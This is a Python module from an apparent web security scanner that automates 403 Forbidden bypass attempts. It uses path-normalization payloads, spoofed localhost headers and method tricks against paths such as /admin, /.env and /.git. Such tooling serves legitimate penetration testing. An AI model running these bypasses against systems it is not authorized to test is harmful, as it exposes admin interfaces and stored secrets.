"""
403 Bypass Module — Active
Tests path normalization, header spoofing, and method tricks on 403 pages.
"""
import asyncio
import re
from .base import BaseModule
from ..utils.networking import HttpClient


class Bypass403(BaseModule):
    name = "bypass_403"
    description = "403 Forbidden Bypass Testing"
    mode = "active"

    # Path normalization payloads (Orange Tsai / PortSwigger)
    PATH_PAYLOADS = [
        "%09", "%20", "%23", "%2e", "%2f", ".", ";", "..;", "..%00",
        ";%09", ";%09..;", ";%2f..", "*", "%2e/", "/.",
    ]

    # Header spoof payloads
    HEADER_PAYLOADS = [
        {"Client-IP": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-Host": "127.0.0.1"},
        {"X-Forwarded-By": "127.0.0.1"},
        {"X-Forwarded-Port": "80"},
        {"X-True-IP": "127.0.0.1"},
        {"Referer": "127.0.0.1"},
        {"X-Original-URL": "/"},
        {"X-Rewrite-URL": "/"},
    ]

    async def run(self, target: str) -> dict:
        domain = target.replace("https://", "").replace("http://", "").split("/")[0]
        base_url = f"https://{domain}"
        results = {
            "paths_tested": [],
            "bypasses_found": [],
            "total_requests": 0,
        }
        findings = []

        async with HttpClient(timeout=15, rate_limit=0.2, follow_redirects=False) as client:
            # First, discover 403 paths from dir bruteforce results or try common ones
            paths_to_test = await self._discover_403_paths(client, base_url)
            
            if not paths_to_test:
                # Use common 403 paths
                paths_to_test = [
                    "/admin", "/internal", "/api/admin", "/api/v1/admin",
                    "/debug", "/console", "/manager", "/.env",
                    "/api/config", "/actuator/env",
                ]

            semaphore = asyncio.Semaphore(self.config.threads)

            async def test_bypass(base_path: str, bypass_url: str, method: str, headers: dict, label: str):
                async with semaphore:
                    try:
                        if method == "GET":
                            resp = await client.get(bypass_url, headers=headers, follow_redirects=False)
                        elif method == "POST":
                            resp = await client.post(bypass_url, headers=headers, follow_redirects=False)
                        elif method == "HEAD":
                            resp = await client.head(bypass_url, headers=headers)
                        else:
                            resp = await client.request(method, bypass_url, headers=headers, follow_redirects=False)
                        
                        results["total_requests"] += 1
                        
                        # Win: 200/301/302 on a path that was 403
                        if resp.status_code in (200, 201, 301, 302, 303):
                            results["bypasses_found"].append({
                                "path": base_path,
                                "bypass_url": bypass_url,
                                "method": method,
                                "status": resp.status_code,
                                "label": label,
                                "headers": headers,
                            })
                    except Exception:
                        pass

            tasks = []
            for path in paths_to_test:
                clean_url = f"{base_url}{path}"
                results["paths_tested"].append(path)

                # 1. Path normalization payloads
                for payload in self.PATH_PAYLOADS:
                    # Insert at various positions
                    segments = path.split("/")
                    for i in range(1, len(segments)):
                        new_segments = segments[:i] + [payload] + segments[i:]
                        new_path = "/".join(new_segments)
                        new_url = f"{base_url}{new_path}"
                        tasks.append(test_bypass(path, new_url, "GET", {}, f"path:{payload}"))

                    # Trailing append
                    tasks.append(test_bypass(path, f"{clean_url}{payload}", "GET", {}, f"trailing:{payload}"))
                    tasks.append(test_bypass(path, f"{clean_url}/{payload}", "GET", {}, f"trailing/{payload}"))

                # 2. Header spoofing
                for hdr_dict in self.HEADER_PAYLOADS:
                    tasks.append(test_bypass(path, clean_url, "GET", hdr_dict, f"header:{list(hdr_dict.keys())[0]}"))

                # 3. Method tricks
                tasks.append(test_bypass(path, clean_url, "POST", {}, "method:POST"))
                tasks.append(test_bypass(path, clean_url, "HEAD", {}, "method:HEAD"))

                # 4. Double-slash
                double_path = path.replace("/", "//")
                tasks.append(test_bypass(path, f"{base_url}{double_path}", "GET", {}, "double-slash"))

                # 5. Case flip
                if "/admin" in path.lower():
                    case_path = path.replace("/admin", "/Admin").replace("/Admin", "/ADMIN")
                    tasks.append(test_bypass(path, f"{base_url}{case_path}", "GET", {}, "case-flip"))

            # Execute all bypass attempts
            await asyncio.gather(*tasks, return_exceptions=True)

        # Generate findings
        if results["bypasses_found"]:
            for bypass in results["bypasses_found"]:
                findings.append({
                    "severity": "high",
                    "title": f"403 Bypass Found: {bypass['path']}",
                    "detail": f"Bypass via {bypass['label']}: {bypass['bypass_url']} → {bypass['status']}",
                    "evidence": bypass,
                })
        
        findings.append({
            "severity": "info",
            "title": f"403 Bypass Testing: {len(results['paths_tested'])} paths, {results['total_requests']} requests",
            "detail": f"{len(results['bypasses_found'])} bypasses found",
        })

        return {
            "module": self.name,
            "target": domain,
            "findings": findings,
            "data": results,
        }

    async def _discover_403_paths(self, client, base_url: str) -> list:
        """Discover 403 paths to test."""
        paths = []
        common_403 = [
            "/admin", "/internal", "/api/internal", "/api/admin",
            "/debug", "/console", "/manager", "/.env",
            "/api/config", "/actuator/env", "/actuator",
            "/swagger", "/graphql", "/.git",
        ]
        for path in common_403:
            try:
                resp = await client.get(f"{base_url}{path}", follow_redirects=False)
                if resp.status_code == 403:
                    paths.append(path)
            except Exception:
                pass
        return paths
